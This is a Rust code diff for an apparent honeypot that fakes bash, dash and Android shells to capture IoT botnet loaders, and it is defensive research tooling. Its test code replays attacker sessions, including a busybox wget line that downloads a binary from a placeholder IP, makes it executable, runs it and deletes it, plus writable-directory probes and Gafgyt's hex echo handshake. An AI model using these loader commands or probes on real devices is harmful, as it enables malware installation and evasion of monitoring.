+        CommandResult::shell_exit(status, output, true)
     }
 
     fn logout_shell(&mut self) -> CommandResult {
         match self.active_level() {
-            ShellLevel::Bash { login: true } if self.levels.len() == 1 => {
+            ShellLevel::Bash { login: true } if self.open_levels() == 1 => {
                 CommandResult::shell_exit(0, b"logout\n".to_vec(), true)
             }
             ShellLevel::Bash { .. } => {
@@ -1495,18 +1504,24 @@ impl FakeShell {
     }
 
     fn cmd_cat(&mut self, parts: &[&str]) -> CommandResult {
-        match first_non_flag_arg(&parts[1..]) {
+        match first_non_flag_arg(&parts[1..]).filter(|path| *path != "-") {
             Some(path) => {
-                let resolved = self.resolve_logical(path);
+                let own_cmdline = format!("/proc/{}/cmdline", self.state().pid);
+                let typed = self.normalize_logical(path);
                 // /proc/self is the reading process (`cat`), so /proc/self/cmdline is its own argv,
                 // NUL-separated with a trailing NUL and no newline - exactly as the kernel returns
                 // it. A missing one ("No such file or directory") is a classic honeypot tell some
-                // Mirai/Gafgyt loaders check before delivering a payload.
-                if resolved == "/proc/self/cmdline" {
+                // Mirai/Gafgyt loaders check before delivering a payload. The shell's own
+                // `/proc/<pid>/cmdline` is the shell's argv.
+                if typed == "/proc/self/cmdline" {
                     let mut out = parts.join("\0");
                     out.push('\0');
                     return CommandResult::stdout(out.into_bytes());
                 }
+                if typed == own_cmdline {
+                    return CommandResult::stdout(format!("{}\0", self.argv_zero()).into_bytes());
+                }
+                let resolved = self.resolve_logical(path);
                 match self.fs.read_all(&resolved, READ_CAP) {
                     Ok(contents) => CommandResult::stdout(contents),
                     Err(FsError::IsADirectory) => {
@@ -1518,12 +1533,14 @@ impl FakeShell {
                     ),
                 }
             }
-            None => CommandResult::silent(0),
+            // No operand: copy standard input through, which is what a pipeline into `cat` and a
+            // `cat < file` need. From the terminal there is nothing to read.
+            None => CommandResult::stdout(self.stdin.take_rest()),
         }
     }
 
     fn cmd_ls(&mut self, parts: &[&str]) -> CommandResult {
-        let cwd = self.cwd.clone();
+        let cwd = self.cwd().to_string();
         let target = first_non_flag_arg(&parts[1..]).unwrap_or(cwd.as_str());
         let show_hidden = parts[1..]
             .iter()
@@ -1550,53 +1567,90 @@ impl FakeShell {
         }
     }
 
-    /// `sh` / `bash`. A bare invocation pushes a nested interactive shell level; `sh -c "CMD"`
-    /// runs CMD under a temporary level, since loaders stage their payload that way.
+    /// `sh` / `bash`. A bare invocation pushes a nested interactive shell level, or, when a
+    /// script is piped in, runs it; `sh -c "CMD"` and `sh FILE` run their text in a shell level of
+    /// their own that ends with it, since loaders stage their payload that way.
     fn cmd_shell_spawn(&mut self, parts: &[&str]) -> CommandResult {
-        let script = parts
-            .iter()
-            .position(|&p| p == "-c")
-            .and_then(|pos| parts.get(pos + 1));
-        if let Some(script) = script {
-            let inner = strip_one_quote_pair(script);
-            let inner_parts: Vec<&str> = inner.split_whitespace().collect();
-            if !inner_parts.is_empty() {
-                let level = self.spawned_level(command_basename(parts[0]), 1);
-                let caller_depth = self.levels.len();
-                self.push_level(level);
-                let result = self.dispatch_nested(&inner_parts);
-                self.levels.truncate(caller_depth);
-                return result;
+        let shell = command_basename(parts[0]);
+        let script_at = parts.iter().position(|&p| p == "-c");
+        let script = script_at.and_then(|pos| parts.get(pos + 1));
+        if let (Some(script), Some(at)) = (script, script_at) {
+            if script.trim().is_empty() {
+                return CommandResult::silent(0);
             }
+            // The operands after the script are `$0` and then the positional parameters.
+            let operands = parts.get(at + 2..).unwrap_or(&[]);
+            return self.run_shell_text(
+                shell,
+                script,
+                operands.first().copied(),
+                operands.get(1..).unwrap_or(&[]),
+            );
         }
-        // `sh FILE` runs a script file. The parser is not built yet, so the file is resolved and
-        // a missing one gets the dialect's open error; anything else exits 0 without running.
         if script.is_none()
             && let Some(file) = first_non_flag_arg(&parts[1..])
         {
-            return self.run_sh_file(command_basename(parts[0]), file);
+            let after = parts
+                .iter()
+                .position(|p| p == &file)
+                .map_or(parts.len(), |i| i + 1);
+            let args = parts.get(after..).unwrap_or(&[]);
+            return self.run_sh_file(shell, file, args);
         }
         if parts.len() == 1 {
-            let level = self.spawned_level(command_basename(parts[0]), 0);
+            if let Some(text) = self.take_piped_script() {
+                return self.run_shell_text(shell, &text, None, &[]);
+            }
+            let level = self.spawned_level(shell, 0);
             self.push_level(level);
         }
         CommandResult::silent(0)
+    }
+
+    /// Run `text` as a script in a shell level of its own, one recursive entry under the depth cap.
+    /// The level inherits the exported variables and working directory; `argv0` and `args` are
+    /// its `$0` and positional parameters.
+    fn run_shell_text(
+        &mut self,
+        shell: &str,
+        text: &str,
+        argv0: Option<&str>,
+        args: &[&str],
+    ) -> CommandResult {
+        let max_depth = self.budget().limits().max_depth;
+        if !self.depth.try_enter(max_depth) {
+            self.record_hit(BudgetHit::Depth);
+            self.note_depth();
+            return CommandResult::silent(1);
+        }
+        self.note_depth();
+        let level = self.spawned_level(shell, 1);
+        let caller_frames = self.frames.len();
+        self.push_script_level(level);
+        let state = self.state_mut();
+        state.argv0 = argv0.map(str::to_string);
+        state.positional = args.iter().map(|a| (*a).to_string()).collect();
+        let result = self.run_script(text);
+        self.frames.truncate(caller_frames);
+        self.depth.leave();
+        result
     }
 
     /// `sh|bash|dash|ash FILE`. `shell_name` is the invoked command's basename: bash reports its own
     /// open error with 127, the dash family dash's with 2. The spawned shell reports at its own
     /// line 0 whatever the caller's line counter says, and pushes no persistent level, like
     /// `sh -c`.
-    fn run_sh_file(&mut self, shell_name: &str, file: &str) -> CommandResult {
+    fn run_sh_file(&mut self, shell_name: &str, file: &str, args: &[&str]) -> CommandResult {
         let path = self.resolve_logical(file);
         match self.fs.read_all(&path, READ_CAP) {
             Ok(bytes) => {
-                let content = String::from_utf8_lossy(&bytes);
-                if is_blank_or_comment_only(&content) {
-                    return CommandResult::silent(0);
+                if !self.charge_work(len_u64(bytes.len())) {
+                    let mut stopped = CommandResult::silent(1);
+                    stopped.stop_line = true;
+                    return stopped;
                 }
-                // Content is recorded as intent by the command event; it is not interpreted yet.
-                CommandResult::silent(0)
+                let content = String::from_utf8_lossy(&bytes);
+                self.run_shell_text(shell_name, &content, Some(file), args)
             }
             Err(_) if shell_name == "bash" => {
                 // [unverified] wording and status: no `bash FILE` capture exists yet.
@@ -1890,123 +1944,6 @@ pub enum ControlOp {
     And,
     /// `||`: run only if the previous command failed.
     Or,
-}
-
-/// Split an input line at its control operators for EXECUTION, unlike `simple_commands`, which
-/// splits more aggressively for URL capture. `;`, `&&`, `||`, a background `&` (one not followed
-/// by another `&` or a non-space, so a URL query's `&b=2` survives) and a newline separate
-/// commands; `|`, parentheses and backticks do not, so a pipeline is dispatched as one command
-/// by its first stage. Each segment is paired with the operator that introduced it.
-fn control_segments(line: &str) -> Vec<(ControlOp, &str)> {
-    let bytes = line.as_bytes();
-    let mut segments = Vec::new();
-    let mut start = 0;
-    let mut op = ControlOp::Seq;
-    let mut i = 0;
-    while i < bytes.len() {
-        let (sep_len, next_op) = match bytes[i] {
-            b';' | b'\n' => (1, ControlOp::Seq),
-            b'&' if bytes.get(i + 1) == Some(&b'&') => (2, ControlOp::And),
-            b'&' if bytes.get(i + 1).is_none_or(|n| n.is_ascii_whitespace()) => (1, ControlOp::Seq),
-            b'|' if bytes.get(i + 1) == Some(&b'|') => (2, ControlOp::Or),
-            _ => {
-                i += 1;
-                continue;
-            }
-        };
-        segments.push((op, &line[start..i]));
-        op = next_op;
-        i += sep_len;
-        start = i;
-    }
-    segments.push((op, &line[start..]));
-    segments
-}
-
-/// The tokens of a segment up to (excluding) the first standalone `|` token. A pipeline is still
-/// answered by its first stage (see `run_line`); redirections that belong to a LATER stage are not
-/// this command's, so they must not be parsed or applied. `cat /bin/ls|head` keeps `/bin/ls|head`
-/// as one token (the `|` is glued, not standalone) and is unaffected.
-fn first_pipeline_stage<'a>(tokens: &'a [&'a str]) -> &'a [&'a str] {
-    match tokens.iter().position(|&t| t == "|") {
-        Some(i) => &tokens[..i],
-        None => tokens,
-    }
-}
-
-/// Split a simple command's whitespace tokens into argv and output redirections. Recognises the
-/// whitespace-delimited forms IoT loaders use:
-///   `>` `>>` `1>` `2>` `2>>`   operator token, target is the NEXT token
-///   `>f` `>>f` `2>f`           target attached to the operator
-///   `2>&1` `1>&2` `>&2`        duplicate another fd's destination
-///   `2>&-`                     close
-/// A token is a redirection operator ONLY when everything before its `>`/`<` is empty or all ASCII
-/// digits: `2>x` parses (fd 2), `i>ii` does NOT and stays a literal argv token (word-attached
-/// operators need the S9 lexer). Input redirections (`<`, `<<`, `<f`) are consumed and dropped, as
-/// the fake shell reads nothing. A bare operator with no target is dropped.
-fn split_redirections<'a>(stage: &[&'a str]) -> Redirected<'a> {
-    let mut argv = Vec::new();
-    let mut redirs = Vec::new();
-    let mut i = 0;
-    while let Some(&t) = stage.get(i) {
-        let digit_count = t.bytes().take_while(u8::is_ascii_digit).count();
-        let (digits, rest) = t.split_at(digit_count);
-        if rest.starts_with('>') {
-            let fd = if digits.is_empty() {
-                1
-            } else {
-                digits.parse::<u8>().unwrap_or(1)
-            };
-            let append = rest.starts_with(">>");
-            let after = &rest[if append { 2 } else { 1 }..];
-            if after.is_empty() {
-                i += 1;
-                if let Some(&next) = stage.get(i) {
-                    redirs.push(Redirection {
-                        fd,
-                        kind: RedirKind::File {
-                            target: next,
-                            append,
-                        },
-                    });
-                }
-            } else if after == "&-" {
-                redirs.push(Redirection {
-                    fd,
-                    kind: RedirKind::Close,
-                });
-            } else if let Some(m) = after.strip_prefix('&') {
-                if let Ok(k) = m.parse::<u8>() {
-                    redirs.push(Redirection {
-                        fd,
-                        kind: RedirKind::Dup(k),
-                    });
-                }
-            } else {
-                redirs.push(Redirection {
-                    fd,
-                    kind: RedirKind::File {
-                        target: after,
-                        append,
-                    },
-                });
-            }
-        } else if let Some(input) = rest.strip_prefix('<') {
-            if input.trim_start_matches('<').is_empty() {
-                i += 1;
-            }
-        } else {
-            argv.push(t);
-        }
-        i += 1;
-    }
-    Redirected { argv, redirs }
-}
-
-/// Redirection targets that discard writes without creating a file. `/dev/null` is a device node
-/// in the filesystem, but matching it here keeps a `>/dev/null` from touching the overlay.
-fn is_discard_path(resolved: &str) -> bool {
-    resolved == "/dev/null"
 }
 
 /// `tftp [-g|-p] [-l LOCAL] [-r REMOTE] HOST [PORT]` (BusyBox) -> `tftp://HOST[:PORT]/REMOTE`.
@@ -2432,7 +2369,7 @@ fn wget_output(parts: &[&str]) -> WgetOutput {
         if p == "-O" {
             match parts.get(i + 1) {
                 Some(&"-") => return WgetOutput::Stdout,
-                Some(name) => return WgetOutput::File(strip_one_quote_pair(name).to_string()),
+                Some(name) => return WgetOutput::File((*name).to_string()),
                 None => return WgetOutput::Default,
             }
         }
@@ -2467,7 +2404,7 @@ fn download_save_name(cmd: &str, parts: &[&str]) -> Option<String> {
                     return Some(wget_basename(fetch_url_arg("curl", args)?));
                 }
                 if a == "-o" || a == "--output" {
-                    return it.next().map(|n| strip_one_quote_pair(n).to_string());
+                    return it.next().map(|n| (*n).to_string());
                 }
                 if let Some(name) = a.strip_prefix("-o")
                     && !name.is_empty()
@@ -2577,24 +2514,15 @@ fn first_non_flag_arg<'a>(args: &[&'a str]) -> Option<&'a str> {
     args.iter().find(|arg| !arg.starts_with('-')).copied()
 }
 
-/// A script whose every line is empty or a comment (first non-blank char `#`). Such a file makes
-/// `sh FILE` exit 0 silently; the `.fxcat` sweep's one-byte "\n" files are the case that matters.
-fn is_blank_or_comment_only(content: &str) -> bool {
-    content.lines().all(|l| {
-        let t = l.trim_start();
-        t.is_empty() || t.starts_with('#')
-    })
-}
-
 /// A honeypot `echo` faithful enough to survive the shell-detection handshakes IoT botnets run
 /// before they drop a payload. The important one is Gafgyt/BASHLITE, which sends
 /// `echo -e "\x47\x41\x59\x46\x47\x54"` and hangs up unless it reads back exactly `GAYFGT`. The
 /// previous implementation joined the raw tokens (flags, surrounding quotes, and undecoded escapes
 /// included), so that probe returned `-e "\x47\x41\x59\x46\x47\x54"` and fingerprinted the honeypot
-/// on the spot. This interprets a leading run of `-e`/`-n`/`-E` flags, removes one pair of matching
-/// surrounding quotes per token (the whitespace tokenizer keeps them), and under `-e` decodes the
-/// backslash escapes a real `echo -e` would. It only transforms text - nothing here is evaluated or
-/// executed, per the module's never-exec guarantee.
+/// on the spot. This interprets a leading run of `-e`/`-n`/`-E` flags and, under `-e`, decodes the
+/// backslash escapes a real `echo -e` would. Quoting was already removed by the shell before the
+/// arguments got here. It only transforms text - nothing here is evaluated or executed, per the
+/// module's never-exec guarantee.
 fn cmd_echo(args: &[&str]) -> String {
     let mut interpret = false; // -e
     let mut trailing_newline = true; // -n suppresses
@@ -2625,35 +2553,19 @@ fn cmd_echo(args: &[&str]) -> String {
         if idx > 0 {
             out.push(' ');
         }
-        let unquoted = strip_one_quote_pair(tok);
         if interpret {
-            if decode_echo_escapes_into(unquoted, &mut out) {
+            if decode_echo_escapes_into(tok, &mut out) {
                 // A `\c` escape stops all further output, including the trailing newline.
                 return out;
             }
         } else {
-            out.push_str(unquoted);
+            out.push_str(tok);
         }
     }
     if trailing_newline {
         out.push('\n');
     }
     out
-}
-
-/// Remove one pair of matching surrounding quotes (`"..."` or `'...'`) from a token, if present.
-/// The fake shell tokenizes on whitespace, so a quoted argument with no internal spaces arrives as
-/// a single token still wearing its quotes; a real shell would have stripped them before `echo`.
-fn strip_one_quote_pair(tok: &str) -> &str {
-    let bytes = tok.as_bytes();
-    if bytes.len() >= 2
-        && (bytes[0] == b'"' || bytes[0] == b'\'')
-        && bytes[bytes.len() - 1] == bytes[0]
-    {
-        &tok[1..tok.len() - 1]
-    } else {
-        tok
-    }
 }
 
 /// Decode the backslash escapes `echo -e` understands, appending to `out`. Returns `true` if a
@@ -2727,1547 +2639,12 @@ fn decode_echo_escapes_into(s: &str, out: &mut String) -> bool {
 }
 
 // Declared with the test modules, after all production code: `trace_type_never_feeds_wire_output`
-// reads shell.rs up to its first `#[cfg(test)]` as the production source.
+// reads each file of this module up to its first `#[cfg(test)]` as the production source, and skips
+// the files that hold only tests.
 #[cfg(test)]
 mod budget_tests;
 
 #[cfg(test)]
-mod echo_tests {
-    use super::cmd_echo;
-
-    #[test]
-    fn gafgyt_handshake_returns_gayfgt() {
-        // The exact probe Gafgyt/BASHLITE sends, tokenized as the fake shell would split it:
-        // `echo` `-e` `"\x47\x41\x59\x46\x47\x54"`. It must read back "GAYFGT" or the bot hangs up.
-        let out = cmd_echo(&["-e", "\"\\x47\\x41\\x59\\x46\\x47\\x54\""]);
-        assert_eq!(out, "GAYFGT\n");
-    }
-
-    #[test]
-    fn plain_echo_strips_surrounding_quotes() {
-        assert_eq!(cmd_echo(&["\"hello\""]), "hello\n");
-        assert_eq!(cmd_echo(&["'world'"]), "world\n");
-    }
-
-    #[test]
-    fn without_dash_e_escapes_stay_literal() {
-        // Default (no -e) and explicit -E both leave backslash escapes untouched.
-        assert_eq!(cmd_echo(&["\\x47"]), "\\x47\n");
-        assert_eq!(cmd_echo(&["-E", "\"\\x47\""]), "\\x47\n");
-    }
-
-    #[test]
-    fn dash_n_suppresses_the_trailing_newline() {
-        assert_eq!(cmd_echo(&["-n", "hi"]), "hi");
-        assert_eq!(cmd_echo(&["-en", "\"\\x41\""]), "A");
-    }
-
-    #[test]
-    fn decodes_hex_and_octal_escapes_under_dash_e() {
-        assert_eq!(cmd_echo(&["-e", "\\x41\\x42"]), "AB\n"); // hex
-        assert_eq!(cmd_echo(&["-e", "\\0101"]), "A\n"); // octal 101 = 'A'
-        assert_eq!(cmd_echo(&["-e", "a\\tb"]), "a\tb\n"); // tab
-    }
-
-    #[test]
-    fn dash_c_stops_output_including_newline() {
-        assert_eq!(cmd_echo(&["-e", "ab\\cd"]), "ab");
-    }
-
-    #[test]
-    fn multiple_operands_join_with_single_spaces() {
-        assert_eq!(cmd_echo(&["a", "b", "c"]), "a b c\n");
-    }
-
-    #[test]
-    fn bare_echo_prints_only_a_newline() {
-        assert_eq!(cmd_echo(&[]), "\n");
-    }
-}
-
+mod grammar_tests;
 #[cfg(test)]
-mod shell_detection_tests {
-    use super::{
-        BUSYBOX_APPLETS, EmitContext, FakeShell, OutputFd, SIGNAL_HONEYPOT_FILE_DOWNLOAD,
-        busybox_banner, cmd_curl, cmd_uname, cmd_wget, download_target, is_busybox_applet, onlcr,
-        simple_commands, url_if_fetch_line,
-    };
-    use crate::fakefs::FakeFs;
-
-    fn shell() -> FakeShell {
-        FakeShell::new(
-            FakeFs::new(),
-            EmitContext {
-                source_ip: "203.0.113.7".parse().unwrap(),
-                wan_ip: None,
-                authenticated: true,
-                protocol_label: "telnet".to_string(),
-                session_id: None,
-            },
-        )
-    }
-
-    fn exec_shell() -> FakeShell {
-        FakeShell::exec(
-            FakeFs::new(),
-            EmitContext {
-                source_ip: "203.0.113.7".parse().unwrap(),
-                wan_ip: None,
-                authenticated: true,
-                protocol_label: "ssh".to_string(),
-                session_id: None,
-            },
-        )
-    }
-
-    #[test]
-    fn login_identity_controls_prompt_argv_zero_and_errors() {
-        let mut sh = shell();
-        assert_eq!(
-            sh.prompt(),
-            format!("root@{}:~# ", crate::persona::hostname())
-        );
-        assert_eq!(sh.handle_input("echo $0").0, "-bash\n");
-        assert_eq!(
-            sh.handle_input("nosuchcmd_q").0,
-            "nosuchcmd_q: command not found\n"
-        );
-        assert_eq!(
-            sh.handle_input("system").0,
-            "Command 'system' not found, did you mean:\n  command 'system3' from deb simh (3.8.1-6.1)\n  command 'systemd' from deb systemd (249.11-0ubuntu3.21)\nTry: apt install <deb name>\n"
-        );
-        assert_eq!(
-            sh.handle_input("ifconfig").0,
-            "Command 'ifconfig' not found, but can be installed with:\napt install net-tools\n"
-        );
-        assert_eq!(
-            sh.handle_input("cd /missing_q").0,
-            "-bash: cd: /missing_q: No such file or directory\n"
-        );
-        assert_eq!(sh.handle_input("cd /tmp").0, "");
-        assert_eq!(
-            sh.prompt(),
-            format!("root@{}:/tmp# ", crate::persona::hostname())
-        );
-    }
-
-    #[test]
-    fn exec_context_has_no_prompt_and_uses_bash_line_one_errors() {
-        let mut sh = exec_shell();
-        assert_eq!(sh.prompt(), "");
-        assert_eq!(sh.handle_input("echo $0").0, "bash\n");
-        assert_eq!(
-            sh.handle_input("nosuchcmd_q").0,
-            "bash: line 1: nosuchcmd_q: command not found\n"
-        );
-        assert_eq!(
-            sh.handle_input("cd /missing_q").0,
-            "bash: line 1: cd: /missing_q: No such file or directory\n"
-        );
-    }
-
-    #[test]
-    fn nested_dash_levels_keep_independent_line_numbers() {
-        let mut sh = shell();
-        assert_eq!(sh.handle_input("sh").0, "");
-        assert_eq!(sh.prompt(), "# ");
-        assert_eq!(sh.handle_input("echo $0").0, "sh\n");
-        assert_eq!(
-            sh.handle_input("outer_missing").0,
-            "sh: 2: outer_missing: not found\n"
-        );
-
-        assert_eq!(sh.handle_input("sh").0, "");
-        assert_eq!(
-            sh.handle_input("inner_missing").0,
-            "sh: 1: inner_missing: not found\n"
-        );
-        let (inner_exit, _) = sh.handle_input("exit");
-        assert_eq!(inner_exit, "");
-        assert!(!inner_exit.close_session);
-        assert_eq!(sh.prompt(), "# ");
-        assert_eq!(
-            sh.handle_input("outer_again").0,
-            "sh: 4: outer_again: not found\n"
-        );
-
-        let (outer_exit, _) = sh.handle_input("exit");
-        assert_eq!(outer_exit, "");
-        assert!(!outer_exit.close_session);
-        assert_eq!(
-            sh.prompt(),
-            format!("root@{}:~# ", crate::persona::hostname())
-        );
-    }
-
-    #[test]
-    fn nested_bash_logout_fails_and_exit_returns_to_login_shell() {
-        let mut sh = shell();
-        assert_eq!(sh.handle_input("su").0, "");
-        assert_eq!(sh.handle_input("echo $0").0, "bash\n");
-        let (logout, _) = sh.handle_input("logout");
-        assert_eq!(logout.status, 1);
-        assert_eq!(logout, "bash: logout: not login shell: use `exit'\n");
-
-        let (nested_exit, _) = sh.handle_input("exit");
-        assert_eq!(nested_exit, "exit\n");
-        assert!(!nested_exit.close_session);
-        assert_eq!(sh.handle_input("echo $0").0, "-bash\n");
-
-        let (login_exit, _) = sh.handle_input("exit; echo must_not_run");
-        assert_eq!(login_exit, "logout\n");
-        assert!(login_exit.close_session);
-    }
-
-    fn xor(s: &str, key: u8) -> String {
-        String::from_utf8(crate::command_codec::xor_bytes(s, key)).unwrap()
-    }
-
-    /// A loader's writable-directory probe as seen in a live session: create an empty file, make
-    /// it executable, run it, and only then move there. The run used to be "command not found",
-    /// so the `cd` never happened; the trailing slash on the `cd` was refused too.
-    #[test]
-    fn writable_directory_probe_runs_the_created_file_and_changes_directory() {
-        let mut sh = shell();
-        let (out, _) = sh.handle_input(">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/");
-        assert_eq!(out, "", "every step of the probe succeeds silently");
-        assert_eq!(sh.handle_input("pwd").0, "/tmp\n");
-        // Without the chmod the file is not runnable, and a path that does not exist is a
-        // missing file, not a missing command.
-        let mut fresh = shell();
-        fresh.handle_input(">/tmp/e");
-        assert_eq!(
-            fresh.handle_input("/tmp/e").0,
-            "-bash: /tmp/e: Permission denied\n"
-        );
-        assert_eq!(
-            fresh.handle_input("/tmp/nothere").0,
-            "-bash: /tmp/nothere: No such file or directory\n"
-        );
-        assert_eq!(
-            fresh.handle_input("/tmp").0,
-            "-bash: /tmp: Is a directory\n"
-        );
-        fresh.handle_input("chmod +x /tmp/e");
-        assert_eq!(fresh.handle_input("/tmp/e").0, "");
-        assert!(super::mode_grants_execute("755"));
-        assert!(super::mode_grants_execute("0755"));
-        assert!(!super::mode_grants_execute("644"));
-        assert!(super::mode_grants_execute("a+x"));
-        assert!(!super::mode_grants_execute("-x"));
-    }
-
-    /// The whole attacker session observed live on 2026-09-06, replayed in order through one
-    /// shell: the Mirai telnet preamble, the two busybox probes, the writable-directory chains,
-    /// and a loader stage. Every reply, the working directory and the emitted events are
-    /// checked, so a line that regresses is caught here even when its own unit test still
-    /// passes. Extend this when a new session line is observed; do not add a narrower test
-    /// instead.
-    #[test]
-    fn observed_session_2026_09_06_replays_end_to_end() {
-        let mut sh = shell();
-        let mut command_events = 0usize;
-        let mut download_urls: Vec<String> = Vec::new();
-        let mut run = |sh: &mut FakeShell, line: &str| -> String {
-            let (out, events) = sh.handle_input(line);
-            for e in &events {
-                match e.signal_type.as_str() {
-                    sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC => command_events += 1,
-                    sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD => download_urls
-                        .push(e.metadata["url"].as_str().unwrap_or_default().to_string()),
-                    _ => {}
-                }
-            }
-            out.to_string()
-        };
-
-        // Preamble: bash lists its builtins for `enable`; `system`, `shell` and `linuxshell` do
-        // not exist on bash; `sh` opens a nested shell silently.
-        let out = run(&mut sh, "enable");
-        assert!(
-            out.contains("enable cd\n") && !out.contains("not found"),
-            "{out}"
-        );
-        assert!(run(&mut sh, "system").starts_with("Command 'system' not found, did you mean:"));
-        assert!(run(&mut sh, "shell").starts_with("Command 'shell' not found, did you mean:"));
-        assert_eq!(
-            run(&mut sh, "linuxshell"),
-            "linuxshell: command not found\n"
-        );
-        assert_eq!(run(&mut sh, "sh"), "");
-
-        // Probes on one line: the listing then the applet reply, in order.
-        assert_eq!(
-            run(&mut sh, "ls /home; /bin/busybox BOTNET"),
-            "ubuntu\nBOTNET: applet not found\n"
-        );
-        let out = run(&mut sh, "cat /proc/mounts; /bin/busybox URUMV");
-        assert!(out.contains("/dev/sda1 / ext4 "), "{out}");
-        assert!(out.ends_with("URUMV: applet not found\n"), "{out}");
-
-        // Writable-directory chains: the marker prints and the shell is left where the chain
-        // ended.
-        let out = run(
-            &mut sh,
-            ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;\
-             >/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;\
-             /bin/busybox echo -e '\\x51\\x4a\\x4c\\x58\\x54\\x4b'",
-        );
-        assert_eq!(out, "QJLXTK\n");
-        assert_eq!(run(&mut sh, "pwd"), "/var\n");
-        assert_eq!(
-            run(&mut sh, ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/"),
-            ""
-        );
-        assert_eq!(run(&mut sh, "pwd"), "/tmp\n");
-
-        // Loader stage: fetch to a file, make it executable, run it, delete it. Each step
-        // depends on what the one before left behind, so the replies are asserted exactly. A
-        // check for the absence of "not found" passed while `./x86` answered "No such file or
-        // directory", which is why the chain broke here unnoticed.
-        let out = run(
-            &mut sh,
-            "/bin/busybox wget http://198.51.100.9/bins/x86 -O x86; chmod 777 x86; ./x86; rm -rf x86",
-        );
-        assert!(out.starts_with("--"), "wget prints its transcript: {out}");
-        assert!(out.contains("Saving to: 'x86'"), "{out}");
-        assert!(out.trim_end().ends_with("saved [1234/1234]"), "{out}");
-        assert!(
-            !out.contains("No such file") && !out.contains("Permission denied"),
-            "every step found what the step before left: {out}"
-        );
-        assert_eq!(
-            run(&mut sh, "ls /tmp"),
-            "d\n",
-            "the payload was removed and the probe file stays hidden"
-        );
-        assert_eq!(download_urls, vec!["http://198.51.100.9/bins/x86"]);
-        assert_eq!(command_events, 13, "one command event per session line");
-    }
-
-    /// ADB is Android's own protocol, and the sensor announces a Nexus 5. The shell behind it
-    /// answered as an Ubuntu bash on server01, which a bot confirms with one command. This is
-    /// the same session an ADB dropper runs, answered as the device.
-    #[test]
-    fn the_adb_shell_answers_as_the_android_device_it_announces() {
-        let mut sh = FakeShell::android(
-            FakeFs::android(),
-            EmitContext {
-                source_ip: "203.0.113.7".parse().unwrap(),
-                wan_ip: None,
-                authenticated: false,
-                protocol_label: "adb".to_string(),
-                session_id: None,
-            },
-        );
-        // An `adb shell` session starts at /, not in a Linux server's /root.
-        assert_eq!(sh.cwd(), "/");
-        assert_eq!(sh.prompt(), crate::persona::android_root_prompt("/"));
-        assert_eq!(sh.handle_input("echo $0").0, "sh\n");
-        assert_eq!(sh.handle_input("pwd").0, "/\n");
-        assert_eq!(
-            sh.handle_input("uname -a").0,
-            format!("{}\n", crate::persona::android_uname_all())
-        );
-        assert_eq!(sh.handle_input("uname -m").0, "armv7l\n");
-        assert_eq!(sh.handle_input("uname -o").0, "Android\n");
-        assert!(
-            !sh.handle_input("uname -a").0.contains("Ubuntu"),
-            "the phone must not report the server's kernel"
-        );
-        // mksh, not bash: the message an unknown command gets is different, and bots read it.
-        assert_eq!(sh.handle_input("foobarbaz").0, "sh: foobarbaz: not found\n");
-        assert!(!sh.handle_input("foobarbaz").0.contains("bash"));
-        // The device's own files answer, and the server's are absent.
-        assert!(
-            sh.handle_input("cat /system/build.prop")
-                .0
-                .contains(crate::persona::ANDROID_MODEL)
-        );
-        assert!(
-            sh.handle_input("cat /default.prop")
-                .0
-                .contains("ro.secure=0")
-        );
-        assert_eq!(
-            sh.handle_input("cat /etc/os-release").0,
-            "cat: /etc/os-release: No such file or directory\n"
-        );
-        // The drop directories work and /system refuses writes, as on a real device.
-        assert_eq!(sh.handle_input("cd /data/local/tmp").0, "");
-        assert_eq!(sh.cwd(), "/data/local/tmp");
-        assert_eq!(sh.handle_input(">payload && chmod 777 payload").0, "");
-        assert_eq!(sh.handle_input("./payload").0, "");
-        assert_eq!(
-            sh.handle_input(">/system/bin/payload").0,
-            "sh: /system/bin/payload: Read-only file system\n"
-        );
-        // Busybox is there because the device is rooted, so a loader chain still runs.
-        assert_eq!(
-            sh.handle_input("/system/bin/sh").0,
-            "",
-            "the device's own shell is present"
-        );
-        assert!(
-            sh.handle_input("busybox ABCDEF")
-                .0
-                .contains("applet not found")
-        );
-        let (nested_exit, _) = sh.handle_input("exit");
-        assert!(!nested_exit.close_session);
-        let (outer_exit, _) = sh.handle_input("exit");
-        assert!(outer_exit.close_session);
-    }
-
-    /// `cp`, `rm` and `mkdir` answered silent success while changing nothing, so a payload
-    /// copied somewhere was not there afterwards and a file the shell said it deleted was still
-    /// readable. Each now changes what the rest of the session sees, and reports the errors the
-    /// real commands report.
-    #[test]
-    fn cp_rm_and_mkdir_change_the_filesystem_the_session_sees() {
-        let mut sh = shell();
-        sh.handle_input(">/tmp/payload");
-        sh.handle_input("chmod +x /tmp/payload");
-
-        // cp copies content and the executable bit; into a directory it keeps the name.
-        assert_eq!(sh.handle_input("cp /tmp/payload /var/tmp/copy").0, "");
-        assert_eq!(sh.handle_input("/var/tmp/copy").0, "", "the copy runs too");
-        assert_eq!(sh.handle_input("cp /tmp/payload /mnt").0, "");
-        assert_eq!(sh.handle_input("ls /mnt").0, "payload\n");
-        assert_eq!(
-            sh.handle_input("cp /tmp/absent /tmp/x").0,
-            "cp: cannot stat '/tmp/absent': No such file or directory\n"
-        );
-
-        // mkdir creates a directory cd and ls accept; -p is quiet about one that exists.
-        assert_eq!(sh.handle_input("mkdir /tmp/stage").0, "");
-        assert_eq!(sh.handle_input("cd /tmp/stage").0, "");
-        assert_eq!(sh.handle_input("pwd").0, "/tmp/stage\n");
-        assert_eq!(
-            sh.handle_input("mkdir /tmp/stage").0,
-            "mkdir: cannot create directory '/tmp/stage': File exists\n"
-        );
-        assert_eq!(sh.handle_input("mkdir -p /tmp/stage/a/b").0, "");
-        assert_eq!(sh.handle_input("cd /tmp/stage/a/b").0, "");
-        assert_eq!(
-            sh.handle_input("mkdir /tmp/absent/deep").0,
-            "mkdir: cannot create directory '/tmp/absent/deep': No such file or directory\n"
-        );
-
-        // rm removes for real, refuses a directory without -r, and -f is quiet about a miss.
-        assert_eq!(sh.handle_input("cd /tmp").0, "");
-        assert_eq!(sh.handle_input("rm payload").0, "");
-        assert_eq!(
-            sh.handle_input("cat /tmp/payload").0,
